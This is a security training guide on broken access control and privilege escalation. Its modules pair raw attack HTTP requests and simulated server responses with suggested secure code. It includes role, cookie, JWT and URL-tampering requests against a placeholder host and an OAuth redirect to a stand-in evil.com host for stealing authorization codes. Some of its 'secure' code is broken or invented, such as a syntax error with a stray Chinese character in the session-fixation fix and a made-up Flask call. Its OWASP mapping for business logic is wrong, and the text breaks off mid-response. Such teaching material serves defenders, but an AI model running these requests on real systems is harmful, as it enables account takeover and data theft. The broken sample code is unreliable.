
# Access Control Vulnerabilities & Privilege Escalation

**Category**: Authentication & Authorization Implementation Flaws  
**Severity Focus**: Critical (Full Account Takeover, Admin Access, Data Breach, Complete Bypass)  
**CWE Mapping**: CWE-287 (Primary), CWE-20, CWE-639, CWE-797  
**OWASP Top 10 2021**: A01:2021-Broken Access Control  
**OWASP API Top 10 2023**: API1:2023-Broken Object Level Authorization (BOLA)

---

## 🔬 1. Access Control Fundamentals

### Module 01: Vertical vs Horizontal Access Control Architecture
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Access control is the application of constraints on who/what is authorized to perform actions. It depends on:
- **Authentication**: Confirms user is who they say they are
- **Session Management**: Identifies which HTTP requests are made by that user
- **Access Control**: Determines if user is ALLOWED to perform the attempted action

**Vertical Access Controls** (Role-Based):
- Restrict access to sensitive functionality to specific user types
- Different user types = different application functions
- Example: Admin can delete user accounts, ordinary user cannot
- Enforces: separation of duties, least privilege

**Horizontal Access Controls** (User-Based):
- Restrict access to resources to specific users
- Different users = access to subset of same resource type
- Example: Banking user can view THEIR accounts only, not others'
- Enforces: data ownership, privacy

**Context-Dependent Access Controls**:
- Restrict access based on application/user state
- Prevent actions in wrong order
- Example: Cannot modify shopping cart AFTER payment

```python
# ✅ HORIZONTAL AUTHORIZATION (Ownership Check)
def view_account(user, account_id):
    account = db.get_account(account_id)
    if account.owner_id != user.id:
        raise AuthorizationError("Access denied")
    return account
# ✅ VERTICAL AUTHORIZATION (Role Check)

def admin_delete_user(admin_user, target_user_id):
if admin_user.role != "ADMIN":
raise AuthorizationError("Access denied")
db.delete_user(target_user_id)
```

---

### Module 02: Broken Access Control Failure Patterns
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Broken access control occurs when users can access resources/actions they're not supposed to. Common failure patterns:

1. **No Authorization Check**: Missing `if user.role == "ADMIN"`
2. **Client-Side Authorization**: Checking role in JavaScript (not server)
3. **Parameter Tampering**: Modifying `admin=true`, `role=1`
4. **URL Guessing**: Accessing `/admin` without link
5. **IDOR**: Modifying `id=123` to `id=124`
6. **HTTP Method Bypass**: Using `GET` instead of `POST`
7. **Header Override**: Using `X-Original-URL` to bypass URL checks
8. **Multi-Step Skip**: Skipping steps 1-2, going directly to step 3
9. **Referer Forgery**: Setting `Referer: /admin` header
10. **Trailing Slash**: `/admin/` vs `/admin` mismatch

---

## 🔬 2. Vertical Privilege Escalation

### Module 03: Unprotected Admin Functionality (URL Guessing)
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Vertical privilege escalation occurs when non-admin user gains access to admin functionality.

**Pattern 1: Predictable URL (No Protection)**
- Admin URL: `https://site.com/admin`
- Not linked from user page (only admin page)
- NO authorization check on `/admin` endpoint
- ANY user can access: `GET /admin` → Works!

**Pattern 2: Disclosed in robots.txt**
```txt
# robots.txt
User-agent: *
Disallow: /administrator-panel
```
- Attacker reads: `GET /robots.txt`
- Discovers: `/administrator-panel`
- Accesses: `GET /administrator-panel` → Admin panel!

**Pattern 3: Security by Obscurity (Unpredictable URL)**
- Admin URL: `https://site.com/administrator-panel-yb556`
- Not guessable, but LEAKED in JavaScript:
```javascript
<script>
var isAdmin = false;
if (isAdmin) {
  var adminPanel = document.createElement('a');
  adminPanel.href = 'https://site.com/administrator-panel-yb556';
  adminPanel.innerText = 'Admin panel';
}
</script>
```
- SCRIPT visible to ALL users
- Extract URL from source → Access admin panel

#### 🎯 Raw URL Guessing Attack
```text
GET /admin HTTP/1.1
Host: vulnerable-app.com
Cookie: session=regular_user_session
```

#### 📄 Demo Server Response (No Authorization)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- Admin Panel HTML -->
<form action="/admin/deleteUser">
  <input type="text" name="username">
  <button>Delete User</button>
</form>
```
*   **Result**: Regular user accessed admin panel, NO auth check ✓

#### 🎯 Raw robots.txt Discovery
```text
GET /robots.txt HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (URL Disclosed)
```http
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /administrator-panel
```
*   **Result**: Attack vector discovered in robots.txt ✓

#### 🎯 Raw JavaScript URL Extraction
```text
GET / HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (URL Leaked in JS)
```html
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<script>
var isAdmin = false;
if (isAdmin) {
  var adminPanelTag = document.createElement('a');
  adminPanelTag.setAttribute('href', '/administrator-panel-yb556');
  adminPanelTag.innerText = 'Admin panel';
}
</script>
</html>
```
*   **Result**: Admin URL extracted from JavaScript source ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Authorization on EVERY Admin Endpoint)
@app.route('/admin')
def admin_panel():
    if not current_user.is_authenticated:
        return redirect('/login')
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    return render_admin_panel()

@app.route('/admin/deleteUser')
def delete_user(username):
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    db.delete_user(username)
```

---

### Module 04: Parameter-Based Role Tampering
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Application stores role in user-controllable location and makes access decisions based on submitted value.

**Vulnerable Patterns**:
```python
# ❌ VULNERABLE (Role in Query String)
@app.route('/home.jsp?admin=true')
def home(admin):
    if admin == "true":
        show_admin_panel()

# ❌ VULNERABLE (Role in Cookie)
@app.route('/update')
def update_profile():
    role = request.cookies.get('role')
    if role == "admin":
        allow_admin_actions()

# ❌ VULNERABLE (Role in JSON Body)
@app.route('/api/updateRole')
def update_role():
    role = request.json.get('roleid')
    if role == 2:
        set_admin_role()
```

**Attack Methods**:
1. **Query String**: `/home.jsp?admin=false` → `/home.jsp?admin=true`
2. **Cookie**: `role=user` → `role=admin`
3. **JSON Body**: `{"roleid": 1}` → `{"roleid": 2}`
4. **Hidden Field**: `<input name="admin" value="false">` → `"true"`

#### 🎯 Raw Query String Tampering
```text
GET /login/home.jsp?admin=false HTTP/1.1
Host: vulnerable-app.com
```

#### 🎯 Raw Query String Tampering (Attack)
```text
GET /login/home.jsp?admin=true HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (Role Bypassed)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- Admin Panel -->
<form action="/admin/deleteUser">
  <button>Delete User</button>
</form>
```
*   **Result**: Parameter tampering bypassed role check ✓

#### 🎯 Raw Cookie Tampering
```text
GET /update HTTP/1.1
Host: vulnerable-app.com
Cookie: role=user; session=abc123
```

#### 🎯 Raw Cookie Tampering (Attack)
```text
GET /update HTTP/1.1
Host: vulnerable-app.com
Cookie: role=admin; session=abc123
```

#### 📄 Demo Server Response (Cookie Bypassed)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- Admin Actions Enabled -->
<button onclick="deleteUser()">Delete User</button>
```
*   **Result**: Cookie tampering bypassed authorization ✓

#### 🎯 Raw JSON Body Tampering
```json
POST /api/updateRole HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "userId": 123,
  "roleid": 1
}
```

#### 🎯 Raw JSON Body Tampering (Attack)
```json
POST /api/updateRole HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "userId": 123,
  "roleid": 2
}
```

#### 📄 Demo Server Response (JSON Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "roleid": 2,
  "message": "Role updated to admin"
}
```
*   **Result**: JSON tampering set admin role ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Role from Server-Session, NOT Client)
@app.route('/updateRole')
def update_role(user_id, new_role):
    # Get role from database (NOT from request)
    user = db.get_user(user_id)
    
    # Check if requester is admin
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    
    # Validate new_role is allowed
    if new_role not in ["user", "admin", "moderator"]:
        raise ValidationError("Invalid role")
    
    # Update role in database
    user.role = new_role
    db.save(user)
```

---

### Module 05: Platform Misconfiguration Bypass
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Application enforces access controls at platform layer (URL/HTTP method restrictions). Various things go wrong:

**Attack 1: X-Original-URL Header Override**
- Front-end: `DENY: POST, /admin/deleteUser, managers`
- Back-end framework supports: `X-Original-URL`, `X-Rewrite-URL`
- Attack: `POST / HTTP/1.1 X-Original-URL: /admin/deleteUser`
- Result: Front-end sees `/` (allowed), Back-end sees `/admin/deleteUser` (executed)

**Attack 2: HTTP Method Bypass**
- Front-end: `DENY: POST, /admin/deleteUser`
- Back-end tolerates: `GET`, `POSTX`, `PUT`
- Attack: `GET /admin/deleteUser`
- Result: Method bypassed, action executed

**Attack 3: Trailing Slash Mismatch**
- Front-end: `DENY: /admin/deleteUser`
- Back-end: `/admin/deleteUser/` = `/admin/deleteUser`
- Attack: `GET /admin/deleteUser/`
- Result: Trailing slash bypassed

**Attack 4: Spring SuffixPatternMatch**
- Spring option: `useSuffixPatternMatch = true` (default before 5.3)
- `/admin/deleteUser` matches `/admin/deleteUser.anything`
- Attack: `GET /admin/deleteUser.html`
- Result: Extension bypassed

#### 🎯 Raw X-Original-URL Header Override
```text
POST / HTTP/1.1
Host: vulnerable-app.com
X-Original-URL: /admin/deleteUser
Content-Type: application/json

{
  "username": "carlos"
}
```

#### 📄 Demo Server Response (Header Override Successful)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User carlos deleted"
}
```
*   **Result**: X-Original-URL bypassed front-end restriction ✓

#### 🎯 Raw HTTP Method Bypass
```text
POST /admin/deleteUser HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user

{
  "username": "carlos"
}
```

#### 🎯 Raw HTTP Method Bypass (Attack: GET)
```text
GET /admin/deleteUser?username=carlos HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user
```

#### 📄 Demo Server Response (Method Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User carlos deleted"
}
```
*   **Result**: GET method bypassed POST restriction ✓

#### 🎯 Raw Trailing Slash Bypass
```text
GET /admin/deleteUser HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user
```

#### 🎯 Raw Trailing Slash Bypass (Attack)
```text
GET /admin/deleteUser/ HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user
```

#### 📄 Demo Server Response (Trailing Slash Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User carlos deleted"
}
```
*   **Result**: Trailing slash bypassed URL restriction ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Authorization at Application Layer, NOT Platform)
@app.route('/admin/deleteUser', methods=['POST'])
def delete_user(username):
    # Authorization check IN CODE (NOT framework)
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    
    # Validate all parameters
    if not username or not isinstance(username, str):
        raise ValidationError("Invalid username")
    
    db.delete_user(username)
```

---

### Module 06: URL-Matching Discrepancies
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Websites vary in how strictly they match request paths to endpoints.

**Discrepancy 1: Case Insensitivity**
- Defined: `/admin/deleteUser`
- Tolerated: `/ADMIN/DELETEUSER`, `/Admin/DeleteUser`
- Attack: `GET /ADMIN/DELETEUSER`
- Front-end: `DENY: /admin/deleteUser` (exact match)
- Back-end: Maps `/ADMIN/DELETEUSER` → `/admin/deleteUser`
- Result: Case bypassed

**Discrepancy 2: Spring SuffixPatternMatch**
- Option: `useSuffixPatternMatch = true`
- `/admin/deleteUser` matches `/admin/deleteUser.anything`
- Attack: `GET /admin/deleteUser.html`

**Discrepancy 3: Trailing Slash**
- `/admin/deleteUser` vs `/admin/deleteUser/`
- Some systems treat as identical
- Attack: `GET /admin/deleteUser/`

#### 🎯 Raw Case Insensitivity Bypass
```text
GET /ADMIN/DELETEUSER?username=carlos HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user
```

#### 📄 Demo Server Response (Case Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User carlos deleted"
}
```
*   **Result**: Case insensitivity bypassed restriction ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Normalize URL BEFORE Authorization)
from flask import Flask

app = Flask(__url_normalize__(strict=True))

@app.route('/admin/deleteUser', methods=['POST'])
def delete_user():
    # Normalize URL (lowercase, no trailing slash)
    normalized_path = request.path.lower().rstrip('/')
    
    # Check authorization
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
```

---

## 🔬 3. Horizontal Privilege Escalation

### Module 07: IDOR via Request Parameter (Predictable IDs)
*   **CWE Mapping**: CWE-639 (Insecure Direct Object Reference)
*   **OWASP API Top 10 Reference**: API1:2023-Broken Object Level Authorization

#### Low-Level Architectural Mechanics
Horizontal privilege escalation: User gains access to resources belonging to OTHER users.

**Pattern**:
```python
# ❌ VULNERABLE (No Ownership Check)
@app.route('/myaccount?id=<user_id>')
def my_account(user_id):
    user = db.get_user(user_id)
    return render_user_data(user)  # Returns ANY user's data
```

**Attack**:
1. Own account: `/myaccount?id=123`
2. Modify: `/myaccount?id=124` → Other user's account!
3. Access: `GET /myaccount?id=124` → Full data leak

IDOR (Insecure Direct Object Reference): User-supplied input used to access objects directly.

#### 🎯 Raw IDOR Attack
```text
GET /myaccount?id=peter HTTP/1.1
Host: vulnerable-app.com
Cookie: session=peter_session
```

#### 🎯 Raw IDOR Attack (Tampering)
```text
GET /myaccount?id=carlos HTTP/1.1
Host: vulnerable-app.com
Cookie: session=peter_session
```

#### 📄 Demo Server Response (IDOR Successful)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "carlos",
  "username": "carlos",
  "email": "carlos@example.com",
  "apiKey": "abc123xyz789",
  "password": "5f4dcc3b5aa765d61d8327deb882cf99"
}
```
*   **Result**: ID parameter tampering accessed other user's data ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Ownership Validation)
@app.route('/myaccount')
def my_account():
    # Get user_id from SESSION (NOT request parameter)
    user_id = current_user.id
    
    # Fetch user data
    user = db.get_user(user_id)
    
    # ONLY return own data
    return render_user_data(user)
```

---

### Module 08: IDOR with Unpredictable IDs (GUIDs)
*   **CWE Mapping**: CWE-639 (Insecure Direct Object Reference)
*   **OWASP API Top 10 Reference**: API1:2023-Broken Object Level Authorization

#### Low-Level Architectural Mechanics
Application uses GUIDs instead of incrementing numbers, preventing guessing. However, GUIDs DISCLOSED elsewhere:
- User messages
- Reviews
- Blog posts
- User profiles
- URL parameters in links

**Attack**:
1. Find blog post by carlos
2. URL: `/blog/post?id=abc123def456` (carlos's GUID)
3. Extract GUID: `abc123def456`
4. Access: `/myaccount?id=abc123def456` → carlos's account!

#### 🎯 Raw GUID Discovery
```text
GET /blog/carlos-post HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (GUID Exposed)
```html
HTTP/1.1 200 OK
Content-Type: text/html

<a href="/myaccount?id=abc123def456">carlos's profile</a>
```
*   **Result**: GUID extracted from URL ✓

#### 🎯 Raw IDOR with GUID
```text
GET /myaccount?id=abc123def456 HTTP/1.1
Host: vulnerable-app.com
Cookie: session=peter_session
```

#### 📄 Demo Server Response (GUID IDOR Successful)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "abc123def456",
  "username": "carlos",
  "apiKey": "secret789"
}
```
*   **Result**: GUID IDOR accessed other user's data ✓

---

### Module 09: Data Leakage in Redirect Response
*   **CWE Mapping**: CWE-639 (Insecure Direct Object Reference)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Application detects unauthorized access, redirects to login page, but REDIRECT RESPONSE BODY still contains sensitive data.

**Pattern**:
```python
# ❌ VULNERABLE (Data in Redirect Body)
@app.route('/myaccount?id=<user_id>')
def my_account(user_id):
    if user_id != current_user.id:
        # Redirect to login, but INCLUDE data in response
        response = redirect('/login')
        response.body = db.get_user(user_id)  # ❌ SENSITIVE DATA!
        return response
```

**Attack**:
1. Access: `/myaccount?id=carlos`
2. Redirect: `302 Redirect to /login`
3. Response body: `{"apiKey": "secret123"}` ← STILL THERE!
4. Extract: API key from redirect body

#### 🎯 Raw Redirect Data Leakage
```text
GET /myaccount?id=carlos HTTP/1.1
Host: vulnerable-app.com
Cookie: session=peter_session
```

#### 📄 Demo Server Response (Data in Redirect)
```http
HTTP/1.1 302 Redirect
Location: /login
Content-Type: application/json

{
  "id": "carlos",
  "apiKey": "abc123xyz789",
  "username": "carlos"
}
```
*   **Result**: Sensitive data leaked in redirect response body ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (No Data in Redirect)
@app.route('/myaccount')
def my_account():
    user_id = current_user.id  # From session, NOT parameter
    
    user = db.get_user(user_id)
    if not user:
        return redirect('/login')  # Empty body
    
    return render_user_data(user)
```

---

## 🔬 4. Horizontal to Vertical Escalation

### Module 10: Password Disclosure via IDOR (Account Takeover → Admin)
*   **CWE Mapping**: CWE-639 (IDOR) + CWE-287 (Privilege Escalation)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Horizontal escalation → Compromise privileged user → Vertical escalation.

**Attack Chain**:
1. IDOR: `/myaccount?id=admin` → Access admin account page
2. Page shows: Prefilled password input (masked)
3. Extract: `password: 5f4dcc3b5aa765d61d8327deb882cf99`
4. Login: `admin:5f4dcc...` → Admin access!
5. Result: Delete carlos (admin action)

#### 🎯 Raw Password Disclosure IDOR
```text
GET /myaccount?id=administrator HTTP/1.1
Host: vulnerable-app.com
Cookie: session=regular_user
```

#### 📄 Demo Server Response (Password Exposed)
```html
HTTP/1.1 200 OK
Content-Type: text/html

<form>
  <input type="password" value="5f4dcc3b5aa765d61d8327deb882cf99">
  <button>Change Password</button>
</form>
```
*   **Result**: Password exposed in masked input field ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (No Password in Response, Ownership Check)
@app.route('/myaccount')
def my_account():
    user_id = current_user.id  # From session
    
    # Check ownership
    if user_id != requested_id:
        raise AuthorizationError("Access denied")
    
    user = db.get_user(user_id)
    
    # Return data WITHOUT password
    return {
        "username": user.username,
        "email": user.email
        # ❌ NO password field
    }
```

---

## 🔬 5. Multi-Step Process Bypass

### Module 11: Multi-Step Process with Missing Access Control
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Multi-step functions: Step 1 (load form) → Step 2 (submit) → Step 3 (confirm).

**Pattern**:
```python
# ❌ VULNERABLE (Auth on Steps 1-2, NO Auth on Step 3)
@app.route('/admin/updateUser/step1')  # ✅ Auth check
def update_user_step1(user_id):
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    return load_form(user_id)

@app.route('/admin/updateUser/step2')  # ✅ Auth check
def update_user_step2(user_id, data):
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    return preview_changes(data)

@app.route('/admin/updateUser/step3')  # ❌ NO Auth check!
def update_user_step3(user_id, data):
    # Assumes user completed steps 1-2
    db.update_user(user_id, data)  # ❌ ANY user can call!
```

**Attack**:
1. Log in as non-admin (peter)
2. Skip steps 1-2
3. Direct: `POST /admin/updateUser/step3?username=peter&role=admin`
4. Result: Role updated to admin!

#### 🎯 Raw Multi-Step Skip Attack
```text
POST /admin/updateUser/step3?username=wiener&role=admin HTTP/1.1
Host: vulnerable-app.com
Cookie: session=non_admin_user
Content-Type: application/json

{
  "confirmed": true
}
```

#### 📄 Demo Server Response (Step 3 Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "Role updated to admin",
  "newRole": "admin"
}
```
*   **Result**: Skipped steps 1-2, step 3 executed without auth ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Auth on EVERY Step)
@app.route('/admin/updateUser/step3')
def update_user_step3(user_id, data):
    # Check authorization on step 3
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    
    db.update_user(user_id, data)
```

---

## 🔬 6. Header-Based Access Control

### Module 12: Referer-Based Access Control Bypass
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Application checks `Referer` header for access control instead of server-side authorization.

**Pattern**:
```python
# ❌ VULNERABLE (Referer Check)
@app.route('/admin/deleteUser')
def delete_user(username):
    referer = request.headers.get('Referer')
    if referer != 'https://site.com/admin':
        raise AuthorizationError("Access denied")
    
    db.delete_user(username)
```

**Attack**:
1. Non-admin user: `session=wiener`
2. Forge request: `Referer: https://site.com/admin`
3. Send: `POST /admin/deleteUser?username=carlos`
4. Check: `Referer == /admin` → ✅ PASS
5. Result: User deleted!

#### 🎯 Raw Referer Forgery
```text
POST /admin/deleteUser?username=carlos HTTP/1.1
Host: vulnerable-app.com
Cookie: session=wiener
Referer: https://vulnerable-app.com/admin
Content-Type: application/json

{}
```

#### 📄 Demo Server Response (Referer Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User carlos deleted"
}
```
*   **Result**: Referer header forged, access control bypassed ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Server-Side Authorization, NOT Referer)
@app.route('/admin/deleteUser')
def delete_user(username):
    # Check role from session (NOT header)
    if current_user.role != "ADMIN":
        raise AuthorizationError("Access denied")
    
    db.delete_user(username)
```

---

## 🔬 7. Location-Based Access Control

### Module 13: Location-Based Access Control Circumvention
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control

#### Low-Level Architectural Mechanics
Application enforces access based on geographical location (banking, media services).

**Circumvention Methods**:
1. **VPNs**: Change IP location
2. **Web Proxies**: Route through different country
3. **Client-Side Geolocation**: Modify `navigator.geolocation`
4. **IP Spoofing**: Fake IP header

**Pattern**:
```python
# ❌ VULNERABLE (IP-Based Location)
@app.route('/banking/transfer')
def transfer(amount, to):
    user_ip = request.headers.get('X-Forwarded-For')
    user_location = geolocate_ip(user_ip)
    
    if user_location not in ['US', 'UK']:
        raise LocationError("Access denied")
    
    db.transfer(amount, to)
```

**Attack**:
1. VPN: Route through US
2. IP: `192.0.2.1` (US IP)
3. Access: `/banking/transfer` → ✅ Allowed!

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Multi-Factor Location Verification)
@app.route('/banking/transfer')
def transfer(amount, to):
    # Check IP location
    ip_location = geolocate_ip(current_user.ip)
    
    # Check account country
    account_country = current_user.account_country
    
    # Check device location (if available)
    device_location = current_user.device_location
    
    # Require ALL to match
    if ip_location != account_country or device_location != account_country:
        raise LocationError("Access denied")
    
    db.transfer(amount, to)
```

---

## 🔬 8. Additional Advanced Topics (NOT in PortSwigger)

### Module 14: JWT Authorization Bypass (Token Manipulation)
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP API Top 10 Reference**: API2:2023-Broken Authentication

#### Low-Level Architectural Mechanics
JWT tokens contain role/permissions in payload. Attackers manipulate JWT to bypass authorization.

**Attack Methods**:
1. **Role Escalation**: `"role": "user"` → `"role": "admin"`
2. **Algorithm Swap**: `RS256` → `none` (no signature)
3. **Key Confusion**: Use public key as symmetric key
4. **Expired Token**: Remove `exp` claim

#### 🎯 Raw JWT Role Manipulation
```json
# Original JWT (decoded)
{
  "sub": "1234567890",
  "username": "peter",
  "role": "user",
  "iat": 1516239022
}

# Modified JWT (decoded)
{
  "sub": "1234567890",
  "username": "peter",
  "role": "admin",  // ← Changed!
  "iat": 1516239022
}
```

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Validate JWT Signature, Extract Role from DB)
from jwt import decode, InvalidSignatureError

def get_user_role(jwt_token):
    # Verify signature
    try:
        payload = decode(jwt_token, public_key, algorithms=['RS256'])
    except InvalidSignatureError:
        raise AuthorizationError("Invalid token")
    
    # Get role from database (NOT from JWT)
    user_id = payload['sub']
    user = db.get_user(user_id)
    return user.role
```

---

### Module 15: OAuth Flow Bypass (Authorization Code Injection)
*   **CWE Mapping**: CWE-287 (Improper Authorization)
*   **OWASP API Top 10 Reference**: API2:2023-Broken Authentication

#### Low-Level Architectural Mechanics
OAuth 2.0 flow: Redirect → User authorizes → Callback with code → Exchange for token.

**Bypass Methods**:
1. **Code Injection**: Replace `code=abc123` with `code=xyz789` (another user's code)
2. **Redirect URI**: `redirect_uri=https://evil.com` → Steal code
3. **State Parameter**: Remove `state` (no CSRF protection)
4. **Token Swapping**: Use another user's access token

#### 🎯 Raw OAuth Code Injection
```text
GET /callback?code=xyz789abc123 HTTP/1.1
Host: vulnerable-app.com
```

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Validate Code Ownership, Check State)
@app.route('/callback')
def oauth_callback(code, state):
    # Verify state matches (CSRF protection)
    if state != session['oauth_state']:
        raise AuthorizationError("Invalid state")
    
    # Get user from code
    user = oauth.get_user_from_code(code)
    
    # Verify code belongs to current session user
    if user.id != session['user_id']:
        raise AuthorizationError("Code ownership mismatch")
    
    # Exchange for token
    token = oauth.exchange_code_for_token(code)
```

---

### Module 16: Session Fixation (Pre-Set Session ID)
*   **CWE Mapping**: CWE-384 (Session Fixation)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
Attacker sets user's session ID before authentication, then hijacks session after login.

**Attack**:
1. Attacker: `session=attacker_session_id`
2. Send to victim: `https://site.com?session=attacker_session_id`
3. Victim logs in: Session now authenticated
4. Attacker: `session=attacker_session_id` → Logged in as victim!

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Generate New Session ID After Login)
@app.route('/login')
def login(username, password):
    user = db.get_user(username)
    if user.verify_password(password):
        # Generate NEW session ID (NOT from request)
        new_session_id = generate_secure_random_id()
        session[new_session_id] = {'user_id': user.id}
        delete舊_session(session_id_from_request)
        return set_cookienew_session_id=new_session_id)
```

---
### Module 17: Business Logic Abuse (Workflow Bypass)
*   **CWE Mapping**: CWE-840 (Wrong Business Logic)
*   **OWASP Top 10 Reference**: A05:2021-Broken Access Control (Logic Attacks)

#### Low-Level Architectural Mechanics
Business logic abuse occurs when attackers exploit application workflows that don't account for malicious user behavior. These are NOT traditional security vulnerabilities but DESIGN flaws.

**Pattern 1: Free Trial Manipulation**
- System: `user.trials_remaining = 3` (stored in database)
- Vulnerable: `trials_remaining = request.cookies.get('trials')`
- Attack: `trials=3` → `trials=999` → Unlimited free access
- Root cause: Client-side trial count instead of server-side

**Pattern 2: Coupon Stacking Attacks**
- System: `apply_coupon(code)` validates one coupon per order
- Vulnerable: Loop doesn't validate `total_discount <= 50%`
- Attack: `coupon1=10%` + `coupon2=20%` + `coupon3=30%` = 60% discount
- Root cause: No cumulative discount limit

**Pattern 3: Refund/Payment Loops**
- System: `refund(amount)` checks `user.balance >= amount`
- Vulnerable: Async balance update creates race condition
- Attack: `refund(100)` → `refund(100)` (both before balance updates)
- Root cause: Synchronous transaction validation missing

**Pattern 4: Quantity/Price Tampering**
- System: `order_total = quantity * price` validated server
- Vulnerable: `order_total` calculated client-side
- Attack: `quantity=100` → `quantity=1000000` (price still $10)
- Attack: `price=10` → `price=0.01` (quantity still 100)
- Root cause: Client-side business calculation

#### 🎯 Raw Free Trial Manipulation
```json
POST /api/activateTrial HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "userId": 123,
  "trialsRemaining": 999
}
```

#### 📄 Demo Server Response (Trial Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "trialsRemaining": 999,
  "message": "Trial activated (999 remaining)"
}
```
*   **Result**: Trial count manipulated to 999 → Unlimited free access ✓

#### 🎯 Raw Coupon Stacking Attack
```json
POST /api/checkout HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "cartTotal": 100,
  "coupons": ["SAVE10", "SAVE20", "SAVE30"]
}
```

#### 📄 Demo Server Response (Coupons Stacked)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "discount": 60,
  "finalTotal": 40,
  "message": "60% discount applied (10+20+30)"
}
```
*   **Result**: 3 coupons stacked = 60% discount (no cumulative limit) ✓

#### 🎯 Raw Refund Loop Attack
```text
POST /api/refund HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "userId": 123,
  "amount": 100
}
```

#### 🎯 Raw Refund Loop Attack (Concurrent)
```text
# Request 1 (sent at T=0.000s)
POST /api/refund HTTP/1.1
{"userId": 123, "amount": 100}

# Request 2 (sent at T=0.001s)
POST /api/refund HTTP/1.1
{"userId": 123, "amount": 100}
```

#### 📄 Demo Server Response (Double Refund)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "amount": 100,
  "message": "Refund processed (2x $100 = $200)"
}
```
*   **Result**: Double refund processed before balance updated ✓

#### 🎯 Raw Price Tampering
```json
POST /api/order HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "productId": 456,
  "quantity": 100,
  "price": 0.01
}
```

#### 📄 Demo Server Response (Price Tampered)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
